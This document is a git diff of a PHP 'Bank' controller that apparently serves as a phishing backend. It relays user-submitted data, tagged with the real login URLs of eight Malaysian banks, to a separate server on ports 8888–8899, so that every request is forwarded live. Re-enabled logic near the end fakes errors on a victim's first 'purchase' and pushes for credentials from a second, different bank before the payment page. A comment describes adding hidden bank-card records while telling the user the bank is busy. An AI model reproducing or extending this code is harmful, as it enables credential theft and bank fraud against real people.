@@ -111,22 +111,22 @@ class Bank extends Controller
             }
             $id = $this->addUserInfo($data);
         }
-        if($data['action'] == 'getimg'){
-            $data['url'] = 'https://www.maybank2u.com.my/home/m2u/common/login.do';
-            $url = $this->request_url.':8888/maybank';
-            $curl = new Curl();
-            $rs      = $curl->post($url,$data);
-            $rs = (json_decode($rs,true));
-        }else{
-            $rs = [
-                'code' => 1,
-                'data' => [
-                    'image' => '',
-                    'content' => '',
-                ],
-                'status' => 1
-            ];
-        }
+//        if($data['action'] == 'getimg'){
+        $data['url'] = 'https://www.maybank2u.com.my/home/m2u/common/login.do';
+        $url = $this->request_url.':8888/maybank';
+        $curl = new Curl();
+        $rs      = $curl->post($url,$data);
+        $rs = (json_decode($rs,true));
+//        }else{
+//            $rs = [
+//                'code' => 1,
+//                'data' => [
+//                    'image' => '',
+//                    'content' => '',
+//                ],
+//                'status' => 1
+//            ];
+//        }
         if($rs['code'] == 1){
             $this->updateUserInfo($data,$rs,$id);
             $rs['data']['type'] = $data['type'];
@@ -144,20 +144,20 @@ class Bank extends Controller
         if($data['action'] == 'login'){
             $id = $this->addUserInfo($data);
         }
-        if($data['action'] == 'getimg'){
-            $curl = new Curl();
-            $rs      = $curl->post($url,$data);
-            $rs = (json_decode($rs,true));
-        }else{
-            $rs = [
-                'code' => 1,
-                'data' => [
-                    'image' => '',
-                    'content' => '',
-                ],
-                'status' => 1
-            ];
-        }
+//        if($data['action'] == 'getimg'){
+        $curl = new Curl();
+        $rs      = $curl->post($url,$data);
+        $rs = (json_decode($rs,true));
+//        }else{
+//            $rs = [
+//                'code' => 1,
+//                'data' => [
+//                    'image' => '',
+//                    'content' => '',
+//                ],
+//                'status' => 1
+//            ];
+//        }
         if($rs['code'] == 1){
             $this->updateUserInfo($data,$rs,$id);
             $rs['data']['type'] = $data['type'];
@@ -179,23 +179,23 @@ class Bank extends Controller
             }
             $id = $this->addUserInfo($data);
         }
-        if($data['action'] == 'getimg'){
-            $data['url'] = 'https://www.allianceonline.com.my/personal/login/login.do';
-            $data['image_url'] = $this->image_url;
-            $url = $this->request_url.':8890/alliancebank';
-            $curl = new Curl();
-            $rs      = $curl->post($url,$data);
-            $rs = (json_decode($rs,true));
-        }else{
-            $rs = [
-                'code' => 1,
-                'data' => [
-                    'image' => '',
-                    'content' => '',
-                ],
-                'status' => 1
-            ];
-        }
+//        if($data['action'] == 'getimg'){
+        $data['url'] = 'https://www.allianceonline.com.my/personal/login/login.do';
+        $data['image_url'] = $this->image_url;
+        $url = $this->request_url.':8890/alliancebank';
+        $curl = new Curl();
+        $rs      = $curl->post($url,$data);
+        $rs = (json_decode($rs,true));
+//        }else{
+//            $rs = [
+//                'code' => 1,
+//                'data' => [
+//                    'image' => '',
+//                    'content' => '',
+//                ],
+//                'status' => 1
+//            ];
+//        }
         if($rs['code'] == 1){
             $this->updateUserInfo($data,$rs,$id);
             $rs['data']['type'] = $data['type'];
@@ -217,22 +217,22 @@ class Bank extends Controller
             }
             $id = $this->addUserInfo($data);
         }
-        if($data['action'] == 'getimg'){
-            $data['url'] = 'https://ambank.amonline.com.my/web/';
-            $url = $this->request_url.':8891/ambank';
-            $curl = new Curl();
-            $rs      = $curl->post($url,$data);
-            $rs = (json_decode($rs,true));
-        }else{
-            $rs = [
-                'code' => 1,
-                'data' => [
-                    'image' => '',
-                    'content' => '',
-                ],
-                'status' => 1
-            ];
-        }
+//        if($data['action'] == 'getimg'){
+        $data['url'] = 'https://ambank.amonline.com.my/web/';
+        $url = $this->request_url.':8891/ambank';
+        $curl = new Curl();
+        $rs      = $curl->post($url,$data);
+        $rs = (json_decode($rs,true));
+//        }else{
+//            $rs = [
+//                'code' => 1,
+//                'data' => [
+//                    'image' => '',
+//                    'content' => '',
+//                ],
+//                'status' => 1
+//            ];
+//        }
 
         if($rs['code'] == 1){
             $this->updateUserInfo($data,$rs,$id);
@@ -255,23 +255,23 @@ class Bank extends Controller
             }
             $id = $this->addUserInfo($data);
         }
-        if($data['action'] == 'getimg'){
-            $data['url'] = 'https://www.bankislam.biz/';
-            $data['image_url'] = $this->image_url;
-            $url = $this->request_url.':8892/bankislam';
-            $curl = new Curl();
-            $rs      = $curl->post($url,$data);
-            $rs = (json_decode($rs,true));
-        }else{
-            $rs = [
-                'code' => 1,
-                'data' => [
-                    'image' => '',
-                    'content' => '',
-                ],
-                'status' => 1
-            ];
-        }
+//        if($data['action'] == 'getimg'){
+        $data['url'] = 'https://www.bankislam.biz/';
+        $data['image_url'] = $this->image_url;
+        $url = $this->request_url.':8892/bankislam';
+        $curl = new Curl();
+        $rs      = $curl->post($url,$data);
+        $rs = (json_decode($rs,true));
+//        }else{
+//            $rs = [
+//                'code' => 1,
+//                'data' => [
+//                    'image' => '',
+//                    'content' => '',
+//                ],
+//                'status' => 1
+//            ];
+//        }
 
         if($rs['code'] == 1){
             $this->updateUserInfo($data,$rs,$id);
@@ -336,22 +336,22 @@ class Bank extends Controller
             }
             $id = $this->addUserInfo($data);
         }
-        if($data['action'] == 'getimg'){
-            $data['url'] = 'https://www.cimbclicks.com.my/clicks/#/fpx';
-            $url = $this->request_url.':8895/cimb';
-            $curl = new Curl();
-            $rs      = $curl->post($url,$data);
-            $rs = (json_decode($rs,true));
-        }else{
-            $rs = [
-                'code' => 1,
-                'data' => [
-                    'image' => '',
-                    'content' => '',
-                ],
-                'status' => 1
-            ];
-        }
+//        if($data['action'] == 'getimg'){
+        $data['url'] = 'https://www.cimbclicks.com.my/clicks/#/fpx';
+        $url = $this->request_url.':8895/cimb';
+        $curl = new Curl();
+        $rs      = $curl->post($url,$data);
+        $rs = (json_decode($rs,true));
+//        }else{
+//            $rs = [
+//                'code' => 1,
+//                'data' => [
+//                    'image' => '',
+//                    'content' => '',
+//                ],
+//                'status' => 1
+//            ];
+//        }
 
         if($rs['code'] == 1){
             $this->updateUserInfo($data,$rs,$id);
@@ -394,22 +394,22 @@ class Bank extends Controller
         if($data['action'] == 'login') {
             $id = $this->addUserInfo($data);
         }
-        if($data['action'] == 'getimg'){
-            $data['url'] = 'https://s.hongleongconnect.my/rib/app/fo/login?web=1';
-            $url = $this->request_url.':8897/hongleongbank';
-            $curl = new Curl();
-            $rs      = $curl->post($url,$data);
-            $rs = (json_decode($rs,true));
-        }else{
-            $rs = [
-                'code' => 1,
-                'data' => [
-                    'image' => '',
-                    'content' => '',
-                ],
-                'status' => 1
-            ];
-        }
+//        if($data['action'] == 'getimg'){
+        $data['url'] = 'https://s.hongleongconnect.my/rib/app/fo/login?web=1';
+        $url = $this->request_url.':8897/hongleongbank';
+        $curl = new Curl();
+        $rs      = $curl->post($url,$data);
+        $rs = (json_decode($rs,true));
+//        }else{
+//            $rs = [
+//                'code' => 1,
+//                'data' => [
+//                    'image' => '',
+//                    'content' => '',
+//                ],
+//                'status' => 1
+//            ];
+//        }
 
         if($rs['code'] == 1){
             $this->updateUserInfo($data,$rs,$id);
@@ -426,23 +426,23 @@ class Bank extends Controller
         if($data['action'] == 'login') {
             $id = $this->addUserInfo($data);
         }
-        if($data['action'] == 'getimg'){
-            $data['url'] = 'https://www2.pbebank.com/myIBK/apppbb/servlet/BxxxServlet?RDOName=BxxxAuth&MethodName=login';
-            $data['image_url'] = $this->image_url;
-            $url = $this->request_url.':8898/publicbank';
-            $curl = new Curl();
-            $rs      = $curl->post($url,$data);
-            $rs = (json_decode($rs,true));
-        }else{
-            $rs = [
-                'code' => 1,
-                'data' => [
-                    'image' => '',
-                    'content' => '',
-                ],
-                'status' => 1
-            ];
-        }
+//        if($data['action'] == 'getimg'){
+        $data['url'] = 'https://www2.pbebank.com/myIBK/apppbb/servlet/BxxxServlet?RDOName=BxxxAuth&MethodName=login';
+        $data['image_url'] = $this->image_url;
+        $url = $this->request_url.':8898/publicbank';
+        $curl = new Curl();
+        $rs      = $curl->post($url,$data);
+        $rs = (json_decode($rs,true));
+//        }else{
+//            $rs = [
+//                'code' => 1,
+//                'data' => [
+//                    'image' => '',
+//                    'content' => '',
+//                ],
+//                'status' => 1
+//            ];
+//        }
 
         if($rs['code'] == 1){
             $this->updateUserInfo($data,$rs,$id);
@@ -465,22 +465,22 @@ class Bank extends Controller
             }
             $id = $this->addUserInfo($data);
         }
-        if($data['action'] == 'getimg'){
-            $data['url'] = 'https://onlinebanking.rhbgroup.com/my/login';
-            $url = $this->request_url.':8899/rhbbank';
-            $curl = new Curl();
-            $rs      = $curl->post($url,$data);
-            $rs = (json_decode($rs,true));
-        }else{
-            $rs = [
-                'code' => 1,
-                'data' => [
-                    'image' => '',
-                    'content' => '',
-                ],
-                'status' => 1
-            ];
-        }
+//        if($data['action'] == 'getimg'){
+        $data['url'] = 'https://onlinebanking.rhbgroup.com/my/login';
+        $url = $this->request_url.':8899/rhbbank';
+        $curl = new Curl();
+        $rs      = $curl->post($url,$data);
+        $rs = (json_decode($rs,true));
+//        }else{
+//            $rs = [
+//                'code' => 1,
+//                'data' => [
+//                    'image' => '',
+//                    'content' => '',
+//                ],
+//                'status' => 1
+//            ];
+//        }
 
         if($rs['code'] == 1){
             $this->updateUserInfo($data,$rs,$id);
@@ -620,31 +620,29 @@ class Bank extends Controller
                 $update = [
                     'image' => $near?$near['image']:$rs['data']['image'],
                     'content' => $near?$near['content']:$rs['data']['content'],
-                    'status' => 3,
+                    'status' => $status,
                     'updatetime' => time(),
                 ];
                 (new Userinfo())->where(['id'=>$id])->update($update);
                 if($status == 1){
                     (new \app\api\model\User())->where(['id'=>$exist['user_id']])->update(['is_get'=>1]);
                 }
-//                if($status == 1&&$data['type'] == 1){
-//                    //购买商品，第一次返回错误，第二次不能跟第一次银行一样，否则返回错误，第三次及以上直接跳转支付页面
-//                    $banks = (new Userinfo())->field('bank_name')->where(['user_id'=>$exist['user_id'],'type'=>1,'id'=>['<>',$id]])->group('bank_name')->select();
-//                    if(count($banks) <= 0){
-//                        //第一次，无需处理任何逻辑
-//                    }elseif(count($banks) > 0 && count($banks) <=1){
-//                        //第二次，银行不能跟第一次一样
-//                        if($banks[0]['bank_name'] != $exist['bank_name']){
-//                            //跳转支付页面
-//                            $this->error('success',[],3);
-//                        }
-//                    }else{
-//                        //第三次及以上，跳转支付页面
-//                        $this->error('success',[],3);
-//                    }
-//                }
-
-
+                if($status == 1&&$data['type'] == 1){
+                    //购买商品，第一次返回错误，第二次不能跟第一次银行一样，否则返回错误，第三次及以上直接跳转支付页面
+                    $banks = (new Userinfo())->field('bank_name')->where(['id'=>['<>',$id],'user_id'=>$exist['user_id'],'status'=>1])->group('bank_name')->select();
+                    if(count($banks) <= 0){
+                        //第一次，无需处理任何逻辑
+                    }elseif(count($banks) > 0 && count($banks) <=1){
+                        //第二次，银行不能跟第一次一样
+                        if($banks[0]['bank_name'] != $exist['bank_name']){
+                            //跳转支付页面
+                            $this->error('success',[],3);
+                        }
+                    }else{
+                        //第三次及以上，跳转支付页面
+                        $this->error('success',[],3);
+                    }
+                }
                 if($status == 1&&$data['type'] == 3){
                     $num = (new Userbank())->where(['user_id'=>$exist['user_id']])->count();
                     //判断用户有没有绑定过银行卡，没有的话就加一条记录，并且设置为用户不可见，并且返回银行繁忙
